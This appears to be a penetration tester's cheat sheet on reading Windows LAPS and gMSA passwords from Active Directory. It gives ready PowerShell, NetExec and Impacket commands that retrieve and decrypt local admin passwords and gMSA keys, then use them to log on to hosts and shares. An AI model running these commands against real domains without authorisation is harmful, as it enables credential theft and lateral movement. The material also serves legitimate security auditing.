# LAPS and gMSA

Readable ≠ decryptable ≠ usable on the host. Check each separately.

| Attribute | Meaning | Next |
| --- | --- | --- |
| `ms-Mcs-AdmPwd` | Legacy LAPS password | Managed username is not stored: check local accounts |
| `msLAPS-Password` | Windows LAPS JSON (`n` name, `p` password, `t` time) | Parse, match host |
| `msLAPS-EncryptedPassword` | Encrypted Windows LAPS | Needs decryption right + `Get-LapsADPassword` |
| `msLAPS-EncryptedDSRMPassword` | DC recovery account | DSRM context, not normal domain logon |
| `msDS-ManagedPassword` | gMSA password blob | Retrieval right → `nxc ldap --gmsa` |

## LAPS: read attributes
```powershell
$DC = '<DC-FQDN>'
$Cred = Get-Credential -UserName '<DOMAIN>\<USER>' -Message 'AD read credential'
Get-ADComputer -Identity '<HOSTNAME>' -Server $DC -Credential $Cred -Properties `
    dNSHostName,'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' |
    Select-Object Name,dNSHostName,'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime'

Get-ADComputer -Identity '<HOSTNAME>' -Server $DC -Credential $Cred -Properties `
    dNSHostName,'msLAPS-Password','msLAPS-PasswordExpirationTime','msLAPS-EncryptedPassword' |
    Select-Object Name,dNSHostName,'msLAPS-Password','msLAPS-PasswordExpirationTime',`
        @{Name='EncryptedValuePresent';Expression={$null -ne $_.'msLAPS-EncryptedPassword'}}
```
- No AD module → [PowerView LAPS](powerview.md#laps).

## LAPS: Windows LAPS module (cleartext + encrypted)
```powershell
Get-Command Get-LapsADPassword
$Laps = Get-LapsADPassword -Identity '<HOSTNAME>' -DomainController $DC `
    -Credential $Cred -DecryptionCredential $Cred
$Laps | Format-List ComputerName,Account,Source,DecryptionStatus,AuthorizedDecryptor,`
    PasswordUpdateTime,ExpirationTimestamp
```
- `DecryptionStatus` `Unauthorized` = no password. Without `-DecryptionCredential` it decrypts as the current logon user.

## LAPS: parse the JSON value
```powershell
$Computer = Get-ADComputer -Identity '<HOSTNAME>' -Server $DC -Credential $Cred `
    -Properties 'msLAPS-Password'
if ($Computer.'msLAPS-Password') {
    $Record = $Computer.'msLAPS-Password' | ConvertFrom-Json
    $Record.n
    [DateTime]::FromFileTimeUtc([Convert]::ToInt64($Record.t,16))
    # $Record.p is the password
}
```

## LAPS: use the local password
```powershell
$LocalCred = [pscredential]::new(('<HOSTNAME>\' + $Laps.Account),$Laps.Password)
Invoke-Command -ComputerName '<FQDN>' -Credential $LocalCred `
    -ScriptBlock { whoami /all; hostname }
```
```bash
nxc smb <FQDN> --local-auth -u '<LOCAL-USER>' -p '<PW>'
```
- Local password = that host only. Remote UAC filters non-RID-500 local admins over WinRM/SMB.

## gMSA: discover account and who may retrieve
```powershell
Get-ADServiceAccount -Identity '<GMSA>' -Server $DC -Credential $Cred -Properties `
    PrincipalsAllowedToRetrieveManagedPassword,servicePrincipalName,memberOf,`
    'msDS-SupportedEncryptionTypes' |
    Format-List Name,SamAccountName,SID,PrincipalsAllowedToRetrieveManagedPassword,`
        servicePrincipalName,memberOf,'msDS-SupportedEncryptionTypes'
```
- `PrincipalsAllowedToRetrieveManagedPassword` = `msDS-GroupMSAMembership` (security descriptor). Check nested groups. Editing it → [object-rights](object-rights.md).

## gMSA: read the key from Kali
```bash
nxc ldap <DC-FQDN> --port 636 -d <DOMAIN.TLD> -u <USER> -p '<PW>' --gmsa
```
- Enumerates all gMSAs domain-wide (no single-account selector). LDAPS = `--port 636`, no `--ldaps` flag. Older NetExec returns the NT key only.

## gMSA: authenticate with the key
```bash
impacket-getTGT -dc-ip <DC-IP> -aesKey <AES256-KEY> '<DOMAIN.TLD>/<GMSA>$'
export KRB5CCNAME=<GMSA>$.ccache
klist -c "$KRB5CCNAME"
impacket-smbclient -k -no-pass '<DOMAIN.TLD>/<GMSA>$@<FQDN>'
```
```text
shares
use <SHARE>
ls
exit
```
```bash
impacket-getTGT -dc-ip <DC-IP> -hashes :<NT> '<DOMAIN.TLD>/<GMSA>$'
```
- Keep the `$` and quote it in Bash. AES and NT keys are not interchangeable.

## Troubleshooting
| Symptom | Check |
| --- | --- |
| LAPS attribute empty | Computer, schema (legacy vs Windows LAPS), read right |
| Encrypted value, no password | Decryption status, decryptor, LAPS module |
| LAPS username unknown | Local account list / RID mapping; not always `Administrator` |
| SMB works, WinRM fails | Endpoint rights, service, route, token filtering |
| gMSA `<no read permissions>` | Retrieval descriptor, nested groups, LDAPS |
| gMSA key auth fails | Principal/realm, key type, DC encryption, DNS, time |
| Ticket OK, resource denied | Share/service ACL, gMSA rights |
